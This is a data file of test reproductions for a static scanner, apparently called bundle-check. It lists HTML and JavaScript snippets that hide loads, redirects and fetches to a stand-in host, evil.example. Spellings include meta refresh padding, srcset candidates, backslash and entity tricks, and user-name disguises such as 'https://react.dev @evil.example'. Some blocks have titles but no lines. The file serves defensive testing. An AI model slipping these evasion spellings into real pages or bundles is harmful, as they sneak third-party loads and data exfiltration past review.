# Every reproduction from bundle-check's review rounds (pull request #20 and the rounds after it),
# one block per finding, read by bundle-check.findings.test.mjs: each block is one test, named
# after its finding, and each line one reproduction with the outcome its finding and the steward's
# ruling give it. The texts are the findings' own, as written.
#
#   == <id> | <class> | <the finding's title>
#   > <the ruling or the reason for an outcome, shown when a reproduction fails>
#   + <file> [<origin or rule> ...] | <text>   refused: a URL rule fires (or each rule named), and
#                                              each origin named is among those it names, exactly
#   - <file> | <text>                          no finding at all
#   ~ <kind> <origins or none or any> | <text> the scan's work stays linear (scanWork's bound),
#                                              and it names exactly these origins (comma-separated)
#
# The classes: A, an outside origin as literal text where it loads or navigates (caught); B, out
# of scope (a host built at run time, no literal host, a disguise only deliberate code writes: its
# outcome is the one the port gives, pinned); C, honest code (no finding); W, the scan's work; R, a
# record or a test's own coverage. In a text, ⟨NL⟩ is a new line, ⟨U+XXXX⟩ that character, and
# ⟨N×S⟩ the text S repeated N times.

== J0 | A | R1.3/R1.5 are not closed: a brace paired wrongly plus a `>` in the substitution's code still hides the rest of a written tag
+ assets/a.js | function f(a){e.innerHTML=`<img alt=${a.map(x=>x.replace(/{/g,'')).join()} src=//evil.example/p.png>`}
+ assets/a.js | function f(a,b){e.innerHTML=`<img ${a>b?"{":""} src=//evil.example/p.png>`}
+ assets/a.js | function f(a){e.innerHTML=`<img alt=${a.split("}").map(p=>p).join()} src=//evil.example/p.png>`}
+ assets/a.js https://evil.example | fetch(`${a?"{":""}https://react.dev @evil.example/x`)

== J1 | A | The R1.6 class is still open on the closing side: the script's own delimiter is read as the attribute's closing quote
+ assets/a.js | e.innerHTML="<img alt=\""+b+">\" src=//evil.example/p.png>";
+ assets/a.js | e.innerHTML='<img alt=\''+b+'>\' src=//evil.example/p.png>';

== J2 | A | A refresh whose prefix is longer than MAX_REFRESH_PREFIX (256) is silently read as no refresh, never refused
> a refresh's time with no digit (`.`) is a spelling only deliberate code writes: ruled out of scope (J65)
+ index.html https://evil.example | <meta http-equiv="refresh" content="0;⟨300× ⟩//evil.example/">
+ index.html https://evil.example | <meta http-equiv="refresh" content="0;⟨300× ⟩https://react.dev @evil.example/">
+ index.html https://evil.example | <meta http-equiv="refresh" content="0.⟨300×0⟩;//evil.example/">
+ index.html https://evil.example | <meta http-equiv="refresh" content="⟨300× ⟩0;https://react.dev @evil.example/">
- index.html | <meta http-equiv="refresh" content=".;//evil.example/">

== J3 | A | The new context for text right after a substitution is lost when a space or C0 control comes between `}` and the URL
+ assets/a.js https://evil.example | fetch(`${a}https://react.dev @evil.example/x`)
+ assets/a.js https://evil.example | fetch(`${a} https://react.dev @evil.example/x`)
+ assets/a.js https://react.dev.evil.example | fetch(`${a}\thttps://react.dev\n.evil.example/x`)

== J4 | B | The new style-attribute reading (CSS escapes after HTML references) treats a `(` a reference spelled as data to CSS, so `url&#40;//host` is never read
> ruled out of scope (J65): references spelling a style attribute's structure are a disguise only
- assets/a.js | e.innerHTML='<div style="background:url&#40;//evil.example/a.png)"></div>';
- index.html | <div style="background:url&lpar;//evil.example/a.png)"></div>
- index.html | <div style="background:url&#40;\2f\2f evil.example/a.png)"></div>

== J5 | A | R1.6 not fully closed: a script's raw string delimiter still closes a value that an escaped quote opened, so later attributes are not read
+ assets/a.js | e.innerHTML="<img alt=\""+n+" > "+m+"\" src=//evil.example/p.png>";
+ assets/a.js | e.innerHTML='<img alt=\''+n+' > '+m+'\' src=//evil.example/p.png>';
+ assets/a.js | e.innerHTML="<img alt=\""+n+" > "+m+"\" srcset=//evil.example/p.png>";
+ assets/a.js https://evil.example | e.innerHTML="<img alt=\""+n+" > "+m+"\" src=https://react.dev\x27@evil.example/p.png>";

== J6 | A | The refresh fix (R1.7) fails open past MAX_REFRESH_PREFIX: a refresh with more than 256 characters before its URL is read as if no refresh started it
+ index.html https://evil.example | <meta http-equiv="refresh" content="0;⟨300× ⟩https://react.dev @evil.example/">
+ index.html https://evil.example | <meta http-equiv="refresh" content="⟨300×0⟩;https://react.dev @evil.example/">
+ index.html https://evil.example | <meta http-equiv="refresh" content="0; url=⟨300× ⟩https://react.dev @evil.example/">
+ index.html https://evil.example | <meta http-equiv="refresh" content="0;⟨300× ⟩//evil.example/">
+ assets/a.js https://evil.example | m.content="0;⟨300× ⟩https://react.dev @evil.example/"

== J7 | A | Later srcset candidates a script sets are recognised only after a simple descriptor or a first candidate opened directly by a quote
+ assets/a.js https://evil.example | jsx("img",{srcSet:"/a.png, /b.png, //evil.example/c.png 3x"})
+ assets/a.js https://evil.example | i.setAttribute("srcset","/a.png 1x, /b.png, //evil.example/c.png 3x")
+ assets/a.js https://evil.example | jsx("img",{srcSet:" /a.png, //evil.example/c.png 2x"})
+ assets/a.js https://evil.example | jsx("img",{srcSet:`⟨NL⟩  /a.png,⟨NL⟩  //evil.example/b.png 2x⟨NL⟩`})
+ assets/a.js https://evil.example | jsx("img",{srcSet:"/a.png 1e1x, //evil.example/c.png 2x"})
+ assets/a.js https://evil.example | jsx("img",{srcSet:"/a.png, /b.png, https://react.dev'@evil.example/c.png 3x"})

== J8 | A | R1.8's 'text right after a substitution' context needs the URL to start exactly at a `}` that the brace counter pairs correctly
+ assets/a.js https://evil.example | i.src=`${p} //evil.example/x.png`
+ assets/a.js https://evil.example | new WebSocket(`${p}\thttps://react.dev @evil.example/x`)
+ assets/a.js https://evil.example | i.src=`${a?"}":""}//evil.example/x.png`
+ assets/a.js https://evil.example | i.src=`${a.replace(/{/g,"")}//evil.example/x.png`
+ assets/a.js https://evil.example | i.src=`${a}//evil.example/x.png`

== J9 | B | afterSubstitution says a substitution 'may write any text' but leaves out the states that text can reach (a value it opens or an `=` it writes)
> ruled out of scope (J65): a substitution that leaves a quote open is a disguise only
- assets/a.js | e.innerHTML=`<img ${a}>x" src=//evil.example/p.png>`
- assets/a.js | e.innerHTML=`<img alt="${a}>' src=//evil.example/p.png>`
- assets/a.js | e.innerHTML=`<img alt${eq}"a>b" src=//evil.example/p.png>`

== J10 | B | readAuthority treats every raw `${` in a script as a substitution, so a fixed host in a plain string or after an escaped `\${` is passed as built at run time
> ruled out of scope (J65) as a disguise; the tokens know a plain string's `${` is text, so its literal host is read and caught
+ assets/a.js https://react.dev${x}.evil.example | fetch("https://react.dev${x}.evil.example/x")
+ assets/a.js https://react.dev${x}.evil.example | fetch(`https://react.dev\${x}.evil.example/x`)

== J11 | A | R1.3/R1.5/R1.1 still open: a `>` inside a `${...}` body (or inside concatenated run-time code) ends the tag in the reader, hiding a later fixed `src`, so a literal cross-origin host passes
+ assets/a.js https://evil.example | e.innerHTML=`<img ${a>b?"{":""} src=//evil.example/p.png>`;
+ assets/a.js https://evil.example | e.innerHTML=`<img ${a?"}":b>c} src=//evil.example/p.png>`;
+ assets/a.js https://evil.example | e.innerHTML="<img "+(a>b?"x":"y")+" src=//evil.example/p.png>";

== J12 | B | R1.7 not fully closed: a meta refresh whose time is a bare '.' (spec-allowed, no digit) is not recognized, so its cross-origin URL passes
> ruled out of scope (J65): a refresh's time with no digit is a spelling only deliberate code writes
- index.html | <meta http-equiv="refresh" content=".;//evil.example/">
- assets/a.js | e.innerHTML='<meta http-equiv=refresh content=.;//evil.example/>';
- index.html | <meta http-equiv="refresh" content=".;https://react.dev⟨NL⟩.evil.example/">
+ index.html https://evil.example | <meta http-equiv="refresh" content="0;//evil.example/">

== J13 | W | Performance regression (ReDoS-class): REFRESH_PREFIX backtracks ~O(digits×spaces) per URL candidate, run for every candidate over a 256-char window, making realistic numeric-heavy assets ~100x slower to scan
~ markup http://www.w3.org | <svg xmlns="http://www.w3.org/2000/svg"><path d="⟨20000×1⟩⟨20000× ⟩x//a"/></svg>
~ markup http://www.w3.org | <svg xmlns="http://www.w3.org/2000/svg">⟨3000×<path d="1111111111111111111111111111111111111111          x//a"/>⟩</svg>

== J14 | B | R1.2 residual: a raw-preserving tagged template (String.raw / lit css`` / styled-components) feeding a CSS sink is JS-decoded first, so a CSS escape that builds a cross-origin host is decoded away and missed
> ruled out of scope (J65) as a disguise; the port reads a tagged template's raw text, which its tag reads, so it is caught
+ assets/a.js https://evil.example | e.style.backgroundImage=String.raw`url(https://react.dev\40 evil.example/a.png)`;

== J15 | A | The third-party-origin check still misses srcset candidates, backslash spellings and HTML-entity spellings that a browser resolves to another origin
+ index.html https://evil.example.com | <img srcset="a.png 1x, //evil.example.com/b.png 2x">
+ index.html https://evil.example.com | <script src="https:\\evil.example.com/x.js"></script>
+ index.html https://evil.example.com | <script src="/\evil.example.com/x.js"></script>

+ index.html https://evil.example.com | <script src="&#x2F;&#x2F;evil.example.com/x.js"></script>

== J16 | A | R1.7/R1.13 only partly closed: protocol-relative URLs with escaped slashes, or in a srcset list, are not read

== J17 | A | The origin check still passes third-party URLs: the user-name rule is cut short by a stop character, and several spellings a browser reads as another host are not matched (R1.7, R1.13 not closed)

== J18 | A | Regression: a protocol-relative URL in an unquoted attribute of markup written by a script is no longer refused

== J19 | A | R2.6 still open for common spellings: a fixed third-party host next to a template substitution, and a URL behind a leading control character

+ assets/a.js https://collector.evil.example | fetch(`https://collector.evil.example${path}`)

== J20 | A | R2.6 not fully closed: a leading C0 control before a URL makes the scanner skip it, or cut its user name short, but the browser strips the control and loads the third-party host

== J25 | A | R2.6/R1.3 not closed for unquoted values: the scanner ends an unquoted attribute's, a CSS url()'s or a srcset candidate's URL at any JavaScript white space, but browsers end it only at ASCII white space, so a VT/NBSP/U+2028/BOM/U+3000 in the user name hides the real host

== J36 | A | Regression: the new template-substitution skip in attributeEquals hides every later attribute of a written tag after a `${` that is not a real substitution
